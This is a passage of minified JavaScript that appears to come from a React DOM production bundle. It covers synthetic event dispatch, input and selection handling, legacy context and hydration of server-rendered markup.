    zm = [9, 13, 27, 32],
    Pl = bt && "CompositionEvent" in window,
    Ur = null;
bt && "documentMode" in document && (Ur = document.documentMode);
var Fm = bt && "TextEvent" in window && !Ur,
    Jd = bt && (!Pl || (Ur && 8 < Ur && 11 >= Ur)),
    Uu = " ",
    Du = !1;
function Xd(t, e) {
    switch (t) {
        case "keyup":
            return zm.indexOf(e.keyCode) !== -1;
        case "keydown":
            return e.keyCode !== 229;
        case "keypress":
        case "mousedown":
        case "focusout":
            return !0;
        default:
            return !1;
    }
}
function Yd(t) {
    return (t = t.detail), typeof t == "object" && "data" in t ? t.data : null;
}
var Fn = !1;
function Bm(t, e) {
    switch (t) {
        case "compositionend":
            return Yd(e);
        case "keypress":
            return e.which !== 32 ? null : ((Du = !0), Uu);
        case "textInput":
            return (t = e.data), t === Uu && Du ? null : t;
        default:
            return null;
    }
}
function Vm(t, e) {
    if (Fn)
        return t === "compositionend" || (!Pl && Xd(t, e)) ? ((t = Qd()), (Ys = El = zt = null), (Fn = !1), t) : null;
    switch (t) {
        case "paste":
            return null;
        case "keypress":
            if (!(e.ctrlKey || e.altKey || e.metaKey) || (e.ctrlKey && e.altKey)) {
                if (e.char && 1 < e.char.length) return e.char;
                if (e.which) return String.fromCharCode(e.which);
            }
            return null;
        case "compositionend":
            return Jd && e.locale !== "ko" ? null : e.data;
        default:
            return null;
    }
}
var Wm = {
    color: !0,
    date: !0,
    datetime: !0,
    "datetime-local": !0,
    email: !0,
    month: !0,
    number: !0,
    password: !0,
    range: !0,
    search: !0,
    tel: !0,
    text: !0,
    time: !0,
    url: !0,
    week: !0,
};
function zu(t) {
    var e = t && t.nodeName && t.nodeName.toLowerCase();
    return e === "input" ? !!Wm[t.type] : e === "textarea";
}
function Zd(t, e, n, r) {
    Td(r),
        (e = vi(e, "onChange")),
        0 < e.length && ((n = new Nl("onChange", "change", null, n, r)), t.push({ event: n, listeners: e }));
}
var Dr = null,
    ts = null;
function Hm(t) {
    ch(t, 0);
}
function Bi(t) {
    var e = Wn(t);
    if (kd(e)) return t;
}
function qm(t, e) {
    if (t === "change") return e;
}
var eh = !1;
if (bt) {
    var Eo;
    if (bt) {
        var No = "oninput" in document;
        if (!No) {
            var Fu = document.createElement("div");
            Fu.setAttribute("oninput", "return;"), (No = typeof Fu.oninput == "function");
        }
        Eo = No;
    } else Eo = !1;
    eh = Eo && (!document.documentMode || 9 < document.documentMode);
}
function Bu() {
    Dr && (Dr.detachEvent("onpropertychange", th), (ts = Dr = null));
}
function th(t) {
    if (t.propertyName === "value" && Bi(ts)) {
        var e = [];
        Zd(e, ts, t, _l(t)), Id(Hm, e);
    }
}
function Gm(t, e, n) {
    t === "focusin" ? (Bu(), (Dr = e), (ts = n), Dr.attachEvent("onpropertychange", th)) : t === "focusout" && Bu();
}
function Km(t) {
    if (t === "selectionchange" || t === "keyup" || t === "keydown") return Bi(ts);
}
function Qm(t, e) {
    if (t === "click") return Bi(e);
}
function Jm(t, e) {
    if (t === "input" || t === "change") return Bi(e);
}
function Xm(t, e) {
    return (t === e && (t !== 0 || 1 / t === 1 / e)) || (t !== t && e !== e);
}
var st = typeof Object.is == "function" ? Object.is : Xm;
function ns(t, e) {
    if (st(t, e)) return !0;
    if (typeof t != "object" || t === null || typeof e != "object" || e === null) return !1;
    var n = Object.keys(t),
        r = Object.keys(e);
    if (n.length !== r.length) return !1;
    for (r = 0; r < n.length; r++) {
        var s = n[r];
        if (!sa.call(e, s) || !st(t[s], e[s])) return !1;
    }
    return !0;
}
function Vu(t) {
    for (; t && t.firstChild; ) t = t.firstChild;
    return t;
}
function Wu(t, e) {
    var n = Vu(t);
    t = 0;
    for (var r; n; ) {
        if (n.nodeType === 3) {
            if (((r = t + n.textContent.length), t <= e && r >= e)) return { node: n, offset: e - t };
            t = r;
        }
        e: {
            for (; n; ) {
                if (n.nextSibling) {
                    n = n.nextSibling;
                    break e;
                }
                n = n.parentNode;
            }
            n = void 0;
        }
        n = Vu(n);
    }
}
function nh(t, e) {
    return t && e
        ? t === e
            ? !0
            : t && t.nodeType === 3
              ? !1
              : e && e.nodeType === 3
                ? nh(t, e.parentNode)
                : "contains" in t
                  ? t.contains(e)
                  : t.compareDocumentPosition
                    ? !!(t.compareDocumentPosition(e) & 16)
                    : !1
        : !1;
}
function rh() {
    for (var t = window, e = ci(); e instanceof t.HTMLIFrameElement; ) {
        try {
            var n = typeof e.contentWindow.location.href == "string";
        } catch {
            n = !1;
        }
        if (n) t = e.contentWindow;
        else break;
        e = ci(t.document);
    }
    return e;
}
function Tl(t) {
    var e = t && t.nodeName && t.nodeName.toLowerCase();
    return (
        e &&
        ((e === "input" &&
            (t.type === "text" ||
                t.type === "search" ||
                t.type === "tel" ||
                t.type === "url" ||
                t.type === "password")) ||
            e === "textarea" ||
            t.contentEditable === "true")
    );
}
function Ym(t) {
    var e = rh(),
        n = t.focusedElem,
        r = t.selectionRange;
    if (e !== n && n && n.ownerDocument && nh(n.ownerDocument.documentElement, n)) {
        if (r !== null && Tl(n)) {
            if (((e = r.start), (t = r.end), t === void 0 && (t = e), "selectionStart" in n))
                (n.selectionStart = e), (n.selectionEnd = Math.min(t, n.value.length));
            else if (((t = ((e = n.ownerDocument || document) && e.defaultView) || window), t.getSelection)) {
                t = t.getSelection();
                var s = n.textContent.length,
                    i = Math.min(r.start, s);
                (r = r.end === void 0 ? i : Math.min(r.end, s)),
                    !t.extend && i > r && ((s = r), (r = i), (i = s)),
                    (s = Wu(n, i));
                var o = Wu(n, r);
                s &&
                    o &&
                    (t.rangeCount !== 1 ||
                        t.anchorNode !== s.node ||
                        t.anchorOffset !== s.offset ||
                        t.focusNode !== o.node ||
                        t.focusOffset !== o.offset) &&
                    ((e = e.createRange()),
                    e.setStart(s.node, s.offset),
                    t.removeAllRanges(),
                    i > r ? (t.addRange(e), t.extend(o.node, o.offset)) : (e.setEnd(o.node, o.offset), t.addRange(e)));
            }
        }
        for (e = [], t = n; (t = t.parentNode); )
            t.nodeType === 1 && e.push({ element: t, left: t.scrollLeft, top: t.scrollTop });
        for (typeof n.focus == "function" && n.focus(), n = 0; n < e.length; n++)
            (t = e[n]), (t.element.scrollLeft = t.left), (t.element.scrollTop = t.top);
    }
}
var Zm = bt && "documentMode" in document && 11 >= document.documentMode,
    Bn = null,
    ka = null,
    zr = null,
    Sa = !1;
function Hu(t, e, n) {
    var r = n.window === n ? n.document : n.nodeType === 9 ? n : n.ownerDocument;
    Sa ||
        Bn == null ||
        Bn !== ci(r) ||
        ((r = Bn),
        "selectionStart" in r && Tl(r)
            ? (r = { start: r.selectionStart, end: r.selectionEnd })
            : ((r = ((r.ownerDocument && r.ownerDocument.defaultView) || window).getSelection()),
              (r = {
                  anchorNode: r.anchorNode,
                  anchorOffset: r.anchorOffset,
                  focusNode: r.focusNode,
                  focusOffset: r.focusOffset,
              })),
        (zr && ns(zr, r)) ||
            ((zr = r),
            (r = vi(ka, "onSelect")),
            0 < r.length &&
                ((e = new Nl("onSelect", "select", null, e, n)), t.push({ event: e, listeners: r }), (e.target = Bn))));
}
function As(t, e) {
    var n = {};
    return (n[t.toLowerCase()] = e.toLowerCase()), (n["Webkit" + t] = "webkit" + e), (n["Moz" + t] = "moz" + e), n;
}
var Vn = {
        animationend: As("Animation", "AnimationEnd"),
        animationiteration: As("Animation", "AnimationIteration"),
        animationstart: As("Animation", "AnimationStart"),
        transitionend: As("Transition", "TransitionEnd"),
    },
    Co = {},
    sh = {};
bt &&
    ((sh = document.createElement("div").style),
    "AnimationEvent" in window ||
        (delete Vn.animationend.animation, delete Vn.animationiteration.animation, delete Vn.animationstart.animation),
    "TransitionEvent" in window || delete Vn.transitionend.transition);
function Vi(t) {
    if (Co[t]) return Co[t];
    if (!Vn[t]) return t;
    var e = Vn[t],
        n;
    for (n in e) if (e.hasOwnProperty(n) && n in sh) return (Co[t] = e[n]);
    return t;
}
var ih = Vi("animationend"),
    oh = Vi("animationiteration"),
    ah = Vi("animationstart"),
    lh = Vi("transitionend"),
    uh = new Map(),
    qu =
        "abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(
            " "
        );
function Zt(t, e) {
    uh.set(t, e), En(e, [t]);
}
for (var Po = 0; Po < qu.length; Po++) {
    var To = qu[Po],
        e0 = To.toLowerCase(),
        t0 = To[0].toUpperCase() + To.slice(1);
    Zt(e0, "on" + t0);
}
Zt(ih, "onAnimationEnd");
Zt(oh, "onAnimationIteration");
Zt(ah, "onAnimationStart");
Zt("dblclick", "onDoubleClick");
Zt("focusin", "onFocus");
Zt("focusout", "onBlur");
Zt(lh, "onTransitionEnd");
sr("onMouseEnter", ["mouseout", "mouseover"]);
sr("onMouseLeave", ["mouseout", "mouseover"]);
sr("onPointerEnter", ["pointerout", "pointerover"]);
sr("onPointerLeave", ["pointerout", "pointerover"]);
En("onChange", "change click focusin focusout input keydown keyup selectionchange".split(" "));
En("onSelect", "focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" "));
En("onBeforeInput", ["compositionend", "keypress", "textInput", "paste"]);
En("onCompositionEnd", "compositionend focusout keydown keypress keyup mousedown".split(" "));
En("onCompositionStart", "compositionstart focusout keydown keypress keyup mousedown".split(" "));
En("onCompositionUpdate", "compositionupdate focusout keydown keypress keyup mousedown".split(" "));
var Ir =
        "abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(
            " "
        ),
    n0 = new Set("cancel close invalid load scroll toggle".split(" ").concat(Ir));
function Gu(t, e, n) {
    var r = t.type || "unknown-event";
    (t.currentTarget = n), em(r, e, void 0, t), (t.currentTarget = null);
}
function ch(t, e) {
    e = (e & 4) !== 0;
    for (var n = 0; n < t.length; n++) {
        var r = t[n],
            s = r.event;
        r = r.listeners;
        e: {
            var i = void 0;
            if (e)
                for (var o = r.length - 1; 0 <= o; o--) {
                    var a = r[o],
                        l = a.instance,
                        c = a.currentTarget;
                    if (((a = a.listener), l !== i && s.isPropagationStopped())) break e;
                    Gu(s, a, c), (i = l);
                }
            else
                for (o = 0; o < r.length; o++) {
                    if (
                        ((a = r[o]),
                        (l = a.instance),
                        (c = a.currentTarget),
                        (a = a.listener),
                        l !== i && s.isPropagationStopped())
                    )
                        break e;
                    Gu(s, a, c), (i = l);
                }
        }
    }
    if (hi) throw ((t = xa), (hi = !1), (xa = null), t);
}
function H(t, e) {
    var n = e[Pa];
    n === void 0 && (n = e[Pa] = new Set());
    var r = t + "__bubble";
    n.has(r) || (dh(e, t, 2, !1), n.add(r));
}
function Ro(t, e, n) {
    var r = 0;
    e && (r |= 4), dh(n, t, r, e);
}
var Ls = "_reactListening" + Math.random().toString(36).slice(2);
function rs(t) {
    if (!t[Ls]) {
        (t[Ls] = !0),
            yd.forEach(function (n) {
                n !== "selectionchange" && (n0.has(n) || Ro(n, !1, t), Ro(n, !0, t));
            });
        var e = t.nodeType === 9 ? t : t.ownerDocument;
        e === null || e[Ls] || ((e[Ls] = !0), Ro("selectionchange", !1, e));
    }
}
function dh(t, e, n, r) {
    switch (Kd(e)) {
        case 1:
            var s = gm;
            break;
        case 4:
            s = vm;
            break;
        default:
            s = jl;
    }
    (n = s.bind(null, e, n, t)),
        (s = void 0),
        !ya || (e !== "touchstart" && e !== "touchmove" && e !== "wheel") || (s = !0),
        r
            ? s !== void 0
                ? t.addEventListener(e, n, { capture: !0, passive: s })
                : t.addEventListener(e, n, !0)
            : s !== void 0
              ? t.addEventListener(e, n, { passive: s })
              : t.addEventListener(e, n, !1);
}
function Oo(t, e, n, r, s) {
    var i = r;
    if (!(e & 1) && !(e & 2) && r !== null)
        e: for (;;) {
            if (r === null) return;
            var o = r.tag;
            if (o === 3 || o === 4) {
                var a = r.stateNode.containerInfo;
                if (a === s || (a.nodeType === 8 && a.parentNode === s)) break;
                if (o === 4)
                    for (o = r.return; o !== null; ) {
                        var l = o.tag;
                        if (
                            (l === 3 || l === 4) &&
                            ((l = o.stateNode.containerInfo), l === s || (l.nodeType === 8 && l.parentNode === s))
                        )
                            return;
                        o = o.return;
                    }
                for (; a !== null; ) {
                    if (((o = mn(a)), o === null)) return;
                    if (((l = o.tag), l === 5 || l === 6)) {
                        r = i = o;
                        continue e;
                    }
                    a = a.parentNode;
                }
            }
            r = r.return;
        }
    Id(function () {
        var c = i,
            d = _l(n),
            h = [];
        e: {
            var f = uh.get(t);
            if (f !== void 0) {
                var v = Nl,
                    y = t;
                switch (t) {
                    case "keypress":
                        if (Zs(n) === 0) break e;
                    case "keydown":
                    case "keyup":
                        v = Om;
                        break;
                    case "focusin":
                        (y = "focus"), (v = jo);
                        break;
                    case "focusout":
                        (y = "blur"), (v = jo);
                        break;
                    case "beforeblur":
                    case "afterblur":
                        v = jo;
                        break;
                    case "click":
                        if (n.button === 2) break e;
                    case "auxclick":
                    case "dblclick":
                    case "mousedown":
                    case "mousemove":
                    case "mouseup":
                    case "mouseout":
                    case "mouseover":
                    case "contextmenu":
                        v = Au;
                        break;
                    case "drag":
                    case "dragend":
                    case "dragenter":
                    case "dragexit":
                    case "dragleave":
                    case "dragover":
                    case "dragstart":
                    case "drop":
                        v = wm;
                        break;
                    case "touchcancel":
                    case "touchend":
                    case "touchmove":
                    case "touchstart":
                        v = Am;
                        break;
                    case ih:
                    case oh:
                    case ah:
                        v = km;
                        break;
                    case lh:
                        v = Mm;
                        break;
                    case "scroll":
                        v = ym;
                        break;
                    case "wheel":
                        v = Dm;
                        break;
                    case "copy":
                    case "cut":
                    case "paste":
                        v = jm;
                        break;
                    case "gotpointercapture":
                    case "lostpointercapture":
                    case "pointercancel":
                    case "pointerdown":
                    case "pointermove":
                    case "pointerout":
                    case "pointerover":
                    case "pointerup":
                        v = Mu;
                }
                var _ = (e & 4) !== 0,
                    b = !_ && t === "scroll",
                    g = _ ? (f !== null ? f + "Capture" : null) : f;
                _ = [];
                for (var p = c, m; p !== null; ) {
                    m = p;
                    var w = m.stateNode;
                    if (
                        (m.tag === 5 &&
                            w !== null &&
                            ((m = w), g !== null && ((w = Xr(p, g)), w != null && _.push(ss(p, w, m)))),
                        b)
                    )
                        break;
                    p = p.return;
                }
                0 < _.length && ((f = new v(f, y, null, n, d)), h.push({ event: f, listeners: _ }));
            }
        }
        if (!(e & 7)) {
            e: {
                if (
                    ((f = t === "mouseover" || t === "pointerover"),
                    (v = t === "mouseout" || t === "pointerout"),
                    f && n !== ga && (y = n.relatedTarget || n.fromElement) && (mn(y) || y[kt]))
                )
                    break e;
                if (
                    (v || f) &&
                    ((f = d.window === d ? d : (f = d.ownerDocument) ? f.defaultView || f.parentWindow : window),
                    v
                        ? ((y = n.relatedTarget || n.toElement),
                          (v = c),
                          (y = y ? mn(y) : null),
                          y !== null && ((b = Nn(y)), y !== b || (y.tag !== 5 && y.tag !== 6)) && (y = null))
                        : ((v = null), (y = c)),
                    v !== y)
                ) {
                    if (
                        ((_ = Au),
                        (w = "onMouseLeave"),
                        (g = "onMouseEnter"),
                        (p = "mouse"),
                        (t === "pointerout" || t === "pointerover") &&
                            ((_ = Mu), (w = "onPointerLeave"), (g = "onPointerEnter"), (p = "pointer")),
                        (b = v == null ? f : Wn(v)),
                        (m = y == null ? f : Wn(y)),
                        (f = new _(w, p + "leave", v, n, d)),
                        (f.target = b),
                        (f.relatedTarget = m),
                        (w = null),
                        mn(d) === c &&
                            ((_ = new _(g, p + "enter", y, n, d)), (_.target = m), (_.relatedTarget = b), (w = _)),
                        (b = w),
                        v && y)
                    )
                        t: {
                            for (_ = v, g = y, p = 0, m = _; m; m = Rn(m)) p++;
                            for (m = 0, w = g; w; w = Rn(w)) m++;
                            for (; 0 < p - m; ) (_ = Rn(_)), p--;
                            for (; 0 < m - p; ) (g = Rn(g)), m--;
                            for (; p--; ) {
                                if (_ === g || (g !== null && _ === g.alternate)) break t;
                                (_ = Rn(_)), (g = Rn(g));
                            }
                            _ = null;
                        }
                    else _ = null;
                    v !== null && Ku(h, f, v, _, !1), y !== null && b !== null && Ku(h, b, y, _, !0);
                }
            }
            e: {
                if (
                    ((f = c ? Wn(c) : window),
                    (v = f.nodeName && f.nodeName.toLowerCase()),
                    v === "select" || (v === "input" && f.type === "file"))
                )
                    var k = qm;
                else if (zu(f))
                    if (eh) k = Jm;
                    else {
                        k = Km;
                        var j = Gm;
                    }
                else
                    (v = f.nodeName) &&
                        v.toLowerCase() === "input" &&
                        (f.type === "checkbox" || f.type === "radio") &&
                        (k = Qm);
                if (k && (k = k(t, c))) {
                    Zd(h, k, n, d);
                    break e;
                }
                j && j(t, f, c),
                    t === "focusout" &&
                        (j = f._wrapperState) &&
                        j.controlled &&
                        f.type === "number" &&
                        da(f, "number", f.value);
            }
            switch (((j = c ? Wn(c) : window), t)) {
                case "focusin":
                    (zu(j) || j.contentEditable === "true") && ((Bn = j), (ka = c), (zr = null));
                    break;
                case "focusout":
                    zr = ka = Bn = null;
                    break;
                case "mousedown":
                    Sa = !0;
                    break;
                case "contextmenu":
                case "mouseup":
                case "dragend":
                    (Sa = !1), Hu(h, n, d);
                    break;
                case "selectionchange":
                    if (Zm) break;
                case "keydown":
                case "keyup":
                    Hu(h, n, d);
            }
            var N;
            if (Pl)
                e: {
                    switch (t) {
                        case "compositionstart":
                            var E = "onCompositionStart";
                            break e;
                        case "compositionend":
                            E = "onCompositionEnd";
                            break e;
                        case "compositionupdate":
                            E = "onCompositionUpdate";
                            break e;
                    }
                    E = void 0;
                }
            else
                Fn
                    ? Xd(t, n) && (E = "onCompositionEnd")
                    : t === "keydown" && n.keyCode === 229 && (E = "onCompositionStart");
            E &&
                (Jd &&
                    n.locale !== "ko" &&
                    (Fn || E !== "onCompositionStart"
                        ? E === "onCompositionEnd" && Fn && (N = Qd())
                        : ((zt = d), (El = "value" in zt ? zt.value : zt.textContent), (Fn = !0))),
                (j = vi(c, E)),
                0 < j.length &&
                    ((E = new Lu(E, t, null, n, d)),
                    h.push({ event: E, listeners: j }),
                    N ? (E.data = N) : ((N = Yd(n)), N !== null && (E.data = N)))),
                (N = Fm ? Bm(t, n) : Vm(t, n)) &&
                    ((c = vi(c, "onBeforeInput")),
                    0 < c.length &&
                        ((d = new Lu("onBeforeInput", "beforeinput", null, n, d)),
                        h.push({ event: d, listeners: c }),
                        (d.data = N)));
        }
        ch(h, e);
    });
}
function ss(t, e, n) {
    return { instance: t, listener: e, currentTarget: n };
}
function vi(t, e) {
    for (var n = e + "Capture", r = []; t !== null; ) {
        var s = t,
            i = s.stateNode;
        s.tag === 5 &&
            i !== null &&
            ((s = i),
            (i = Xr(t, n)),
            i != null && r.unshift(ss(t, i, s)),
            (i = Xr(t, e)),
            i != null && r.push(ss(t, i, s))),
            (t = t.return);
    }
    return r;
}
function Rn(t) {
    if (t === null) return null;
    do t = t.return;
    while (t && t.tag !== 5);
    return t || null;
}
function Ku(t, e, n, r, s) {
    for (var i = e._reactName, o = []; n !== null && n !== r; ) {
        var a = n,
            l = a.alternate,
            c = a.stateNode;
        if (l !== null && l === r) break;
        a.tag === 5 &&
            c !== null &&
            ((a = c),
            s
                ? ((l = Xr(n, i)), l != null && o.unshift(ss(n, l, a)))
                : s || ((l = Xr(n, i)), l != null && o.push(ss(n, l, a)))),
            (n = n.return);
    }
    o.length !== 0 && t.push({ event: e, listeners: o });
}
var r0 = /\r\n?/g,
    s0 = /\u0000|\uFFFD/g;
function Qu(t) {
    return (typeof t == "string" ? t : "" + t)
        .replace(
            r0,
            `
`
        )
        .replace(s0, "");
}
function Ms(t, e, n) {
    if (((e = Qu(e)), Qu(t) !== e && n)) throw Error(S(425));
}
function yi() {}
var ja = null,
    Ea = null;
function Na(t, e) {
    return (
        t === "textarea" ||
        t === "noscript" ||
        typeof e.children == "string" ||
        typeof e.children == "number" ||
        (typeof e.dangerouslySetInnerHTML == "object" &&
            e.dangerouslySetInnerHTML !== null &&
            e.dangerouslySetInnerHTML.__html != null)
    );
}
var Ca = typeof setTimeout == "function" ? setTimeout : void 0,
    i0 = typeof clearTimeout == "function" ? clearTimeout : void 0,
    Ju = typeof Promise == "function" ? Promise : void 0,
    o0 =
        typeof queueMicrotask == "function"
            ? queueMicrotask
            : typeof Ju < "u"
              ? function (t) {
                    return Ju.resolve(null).then(t).catch(a0);
                }
              : Ca;
function a0(t) {
    setTimeout(function () {
        throw t;
    });
}
function $o(t, e) {
    var n = e,
        r = 0;
    do {
        var s = n.nextSibling;
        if ((t.removeChild(n), s && s.nodeType === 8))
            if (((n = s.data), n === "/$")) {
                if (r === 0) {
                    t.removeChild(s), es(e);
                    return;
                }
                r--;
            } else (n !== "$" && n !== "$?" && n !== "$!") || r++;
        n = s;
    } while (n);
    es(e);
}
function qt(t) {
    for (; t != null; t = t.nextSibling) {
        var e = t.nodeType;
        if (e === 1 || e === 3) break;
        if (e === 8) {
            if (((e = t.data), e === "$" || e === "$!" || e === "$?")) break;
            if (e === "/$") return null;
        }
    }
    return t;
}
function Xu(t) {
    t = t.previousSibling;
    for (var e = 0; t; ) {
        if (t.nodeType === 8) {
            var n = t.data;
            if (n === "$" || n === "$!" || n === "$?") {
                if (e === 0) return t;
                e--;
            } else n === "/$" && e++;
        }
        t = t.previousSibling;
    }
    return null;
}
var pr = Math.random().toString(36).slice(2),
    dt = "__reactFiber$" + pr,
    is = "__reactProps$" + pr,
    kt = "__reactContainer$" + pr,
    Pa = "__reactEvents$" + pr,
    l0 = "__reactListeners$" + pr,
    u0 = "__reactHandles$" + pr;
function mn(t) {
    var e = t[dt];
    if (e) return e;
    for (var n = t.parentNode; n; ) {
        if ((e = n[kt] || n[dt])) {
            if (((n = e.alternate), e.child !== null || (n !== null && n.child !== null)))
                for (t = Xu(t); t !== null; ) {
                    if ((n = t[dt])) return n;
                    t = Xu(t);
                }
            return e;
        }
        (t = n), (n = t.parentNode);
    }
    return null;
}
function ys(t) {
    return (t = t[dt] || t[kt]), !t || (t.tag !== 5 && t.tag !== 6 && t.tag !== 13 && t.tag !== 3) ? null : t;
}
function Wn(t) {
    if (t.tag === 5 || t.tag === 6) return t.stateNode;
    throw Error(S(33));
}
function Wi(t) {
    return t[is] || null;
}
var Ta = [],
    Hn = -1;
function en(t) {
    return { current: t };
}
function q(t) {
    0 > Hn || ((t.current = Ta[Hn]), (Ta[Hn] = null), Hn--);
}
function V(t, e) {
    Hn++, (Ta[Hn] = t.current), (t.current = e);
}
var Yt = {},
    xe = en(Yt),
    Te = en(!1),
    _n = Yt;
function ir(t, e) {
    var n = t.type.contextTypes;
    if (!n) return Yt;
    var r = t.stateNode;
    if (r && r.__reactInternalMemoizedUnmaskedChildContext === e) return r.__reactInternalMemoizedMaskedChildContext;
    var s = {},
        i;
    for (i in n) s[i] = e[i];
    return (
        r &&
            ((t = t.stateNode),
            (t.__reactInternalMemoizedUnmaskedChildContext = e),
            (t.__reactInternalMemoizedMaskedChildContext = s)),
        s
    );
}
function Re(t) {
    return (t = t.childContextTypes), t != null;
}
function xi() {
    q(Te), q(xe);
}
function Yu(t, e, n) {
    if (xe.current !== Yt) throw Error(S(168));
    V(xe, e), V(Te, n);
}
function hh(t, e, n) {
    var r = t.stateNode;
    if (((e = e.childContextTypes), typeof r.getChildContext != "function")) return n;
    r = r.getChildContext();
    for (var s in r) if (!(s in e)) throw Error(S(108, Gp(t) || "Unknown", s));
    return X({}, n, r);
}
function wi(t) {
    return (
        (t = ((t = t.stateNode) && t.__reactInternalMemoizedMergedChildContext) || Yt),
        (_n = xe.current),
        V(xe, t),
        V(Te, Te.current),
        !0
    );
}
function Zu(t, e, n) {
    var r = t.stateNode;
    if (!r) throw Error(S(169));
    n ? ((t = hh(t, e, _n)), (r.__reactInternalMemoizedMergedChildContext = t), q(Te), q(xe), V(xe, t)) : q(Te),
        V(Te, n);
}
var yt = null,
    Hi = !1,
    Io = !1;
function fh(t) {
    yt === null ? (yt = [t]) : yt.push(t);
}
function c0(t) {
    (Hi = !0), fh(t);
}
function tn() {
    if (!Io && yt !== null) {
        Io = !0;
        var t = 0,
            e = D;
        try {
            var n = yt;
            for (D = 1; t < n.length; t++) {
                var r = n[t];
                do r = r(!0);
                while (r !== null);
            }
            (yt = null), (Hi = !1);
        } catch (s) {
            throw (yt !== null && (yt = yt.slice(t + 1)), Ud(bl, tn), s);
        } finally {
            (D = e), (Io = !1);
        }
    }
    return null;
}
var qn = [],
    Gn = 0,
    _i = null,
    bi = 0,
    Be = [],
    Ve = 0,
    bn = null,
    xt = 1,
    wt = "";
function ln(t, e) {
    (qn[Gn++] = bi), (qn[Gn++] = _i), (_i = t), (bi = e);
}
function ph(t, e, n) {
    (Be[Ve++] = xt), (Be[Ve++] = wt), (Be[Ve++] = bn), (bn = t);
    var r = xt;
    t = wt;
    var s = 32 - nt(r) - 1;
    (r &= ~(1 << s)), (n += 1);
    var i = 32 - nt(e) + s;
    if (30 < i) {
        var o = s - (s % 5);
        (i = (r & ((1 << o) - 1)).toString(32)),
            (r >>= o),
            (s -= o),
            (xt = (1 << (32 - nt(e) + s)) | (n << s) | r),
            (wt = i + t);
    } else (xt = (1 << i) | (n << s) | r), (wt = t);
}
function Rl(t) {
    t.return !== null && (ln(t, 1), ph(t, 1, 0));
}
function Ol(t) {
    for (; t === _i; ) (_i = qn[--Gn]), (qn[Gn] = null), (bi = qn[--Gn]), (qn[Gn] = null);
    for (; t === bn; )
        (bn = Be[--Ve]), (Be[Ve] = null), (wt = Be[--Ve]), (Be[Ve] = null), (xt = Be[--Ve]), (Be[Ve] = null);
}
var Le = null,
    Ae = null,
    K = !1,
    tt = null;
function mh(t, e) {
    var n = He(5, null, null, 0);
    (n.elementType = "DELETED"),
        (n.stateNode = e),
        (n.return = t),
        (e = t.deletions),
        e === null ? ((t.deletions = [n]), (t.flags |= 16)) : e.push(n);
}
function ec(t, e) {
    switch (t.tag) {
        case 5:
            var n = t.type;
            return (
                (e = e.nodeType !== 1 || n.toLowerCase() !== e.nodeName.toLowerCase() ? null : e),
                e !== null ? ((t.stateNode = e), (Le = t), (Ae = qt(e.firstChild)), !0) : !1
            );
        case 6:
            return (
                (e = t.pendingProps === "" || e.nodeType !== 3 ? null : e),
                e !== null ? ((t.stateNode = e), (Le = t), (Ae = null), !0) : !1
            );
        case 13:
            return (
                (e = e.nodeType !== 8 ? null : e),
                e !== null
                    ? ((n = bn !== null ? { id: xt, overflow: wt } : null),
                      (t.memoizedState = { dehydrated: e, treeContext: n, retryLane: 1073741824 }),
                      (n = He(18, null, null, 0)),
                      (n.stateNode = e),
                      (n.return = t),
                      (t.child = n),
                      (Le = t),
                      (Ae = null),
                      !0)
                    : !1
            );
        default:
            return !1;
    }
}
function Ra(t) {
    return (t.mode & 1) !== 0 && (t.flags & 128) === 0;
}
function Oa(t) {
    if (K) {
        var e = Ae;
        if (e) {
            var n = e;
            if (!ec(t, e)) {
                if (Ra(t)) throw Error(S(418));
                e = qt(n.nextSibling);
                var r = Le;
                e && ec(t, e) ? mh(r, n) : ((t.flags = (t.flags & -4097) | 2), (K = !1), (Le = t));
            }
        } else {
            if (Ra(t)) throw Error(S(418));
            (t.flags = (t.flags & -4097) | 2), (K = !1), (Le = t);
        }
    }
}
function tc(t) {
    for (t = t.return; t !== null && t.tag !== 5 && t.tag !== 3 && t.tag !== 13; ) t = t.return;
    Le = t;
}
function Us(t) {
    if (t !== Le) return !1;
    if (!K) return tc(t), (K = !0), !1;
    var e;
    if (
        ((e = t.tag !== 3) &&
            !(e = t.tag !== 5) &&
            ((e = t.type), (e = e !== "head" && e !== "body" && !Na(t.type, t.memoizedProps))),
        e && (e = Ae))
    ) {
        if (Ra(t)) throw (gh(), Error(S(418)));
        for (; e; ) mh(t, e), (e = qt(e.nextSibling));
    }
    if ((tc(t), t.tag === 13)) {
        if (((t = t.memoizedState), (t = t !== null ? t.dehydrated : null), !t)) throw Error(S(317));
        e: {
            for (t = t.nextSibling, e = 0; t; ) {
                if (t.nodeType === 8) {
                    var n = t.data;
                    if (n === "/$") {
                        if (e === 0) {
                            Ae = qt(t.nextSibling);
                            break e;
                        }
                        e--;
                    } else (n !== "$" && n !== "$!" && n !== "$?") || e++;
                }
                t = t.nextSibling;
            }
            Ae = null;
        }
    } else Ae = Le ? qt(t.stateNode.nextSibling) : null;
    return !0;
}
function gh() {
    for (var t = Ae; t; ) t = qt(t.nextSibling);
}
function or() {
    (Ae = Le = null), (K = !1);
}
function $l(t) {
    tt === null ? (tt = [t]) : tt.push(t);
}
var d0 = Et.ReactCurrentBatchConfig;
function Er(t, e, n) {
    if (((t = n.ref), t !== null && typeof t != "function" && typeof t != "object")) {
        if (n._owner) {
            if (((n = n._owner), n)) {
                if (n.tag !== 1) throw Error(S(309));
                var r = n.stateNode;
            }
            if (!r) throw Error(S(147, t));
            var s = r,
                i = "" + t;
            return e !== null && e.ref !== null && typeof e.ref == "function" && e.ref._stringRef === i
                ? e.ref
                : ((e = function (o) {
                      var a = s.refs;
                      o === null ? delete a[i] : (a[i] = o);
                  }),
                  (e._stringRef = i),
                  e);
        }
        if (typeof t != "string") throw Error(S(284));
        if (!n._owner) throw Error(S(290, t));
    }
    return t;
}
function Ds(t, e) {
    throw (
        ((t = Object.prototype.toString.call(e)),
